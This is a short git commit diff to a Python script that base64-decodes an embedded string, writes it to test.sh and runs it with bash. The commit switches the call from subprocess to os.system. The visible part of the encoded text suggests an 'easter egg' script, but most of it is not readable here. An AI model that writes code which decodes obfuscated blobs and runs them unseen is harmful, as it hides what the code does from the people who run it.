9eba9dbe354f4b110acdff2a53ad05175535d5b2
Marc SIBERT <Marcussacapuces91@users.noreply.github.com>
2025-06-23 08:42:48 +0200

    Use os.system

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import base64
 import binascii
-import subprocess
+import os
 
 coded_string = """IyEvYmluL2Jhc2gKCiMgQ29uZ3Jhd
 HVsYXRpb25zISBZb3UgZm91bmQgdGhlIGVhc3RlciBlZ2chIOKdpO+4jwojIOOBiuO
@@ -45,4 +45,4 @@ print(f"\n## Final string\n\n{utf_8_string}\n")
 with open("test.sh", 'wt', encoding='utf-8') as file:
   file.write(utf_8_string)
   
-subprocess.run(['bash', 'test.sh'], capture_output=True)
+os.system('bash test.sh')
